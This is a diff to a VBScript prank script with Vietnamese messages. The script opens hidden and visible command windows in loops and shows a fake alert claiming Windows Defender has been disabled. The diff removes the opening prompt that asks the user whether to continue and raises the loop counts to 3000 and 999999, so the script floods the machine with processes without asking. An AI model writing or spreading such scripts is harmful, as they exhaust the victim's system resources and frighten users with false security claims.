@@ -1,14 +1,6 @@
-Dim result
-result = MsgBox("Ban co muon tiep tuc chay chu?", vbYesNo, "Lua chon")
-If result = vbYes Then
-    MsgBox "Chuong trinh se chay!"
-ElseIf result = vbNo Then
-    MsgBox "NGU!"
-    WScript.Quit
-End If
 Set objShell = CreateObject("WScript.Shell")
 count = 0
-Do While count < 300
+Do While count < 3000
     objShell.Run "cmd /c MsgBox ""Error""", 0, False
     count = count + 1
 Loop
@@ -23,7 +15,7 @@ X=Msgbox("Da mat quyen kiem soat, toi da tat Windows Defender di roi haha",0+16,
 Set WshShell = CreateObject("WScript.Shell")
 WshShell.Run "cmd.exe /k mode con: cols=120 lines=32766"
 Set objShell = CreateObject("WScript.Shell")
-For i = 1 To 999
+For i = 1 To 999999
     objShell.Run "cmd.exe /k color 4 & dir /s", 1, False
     WScript.Sleep 100
     objShell.AppActivate "Command Prompt"
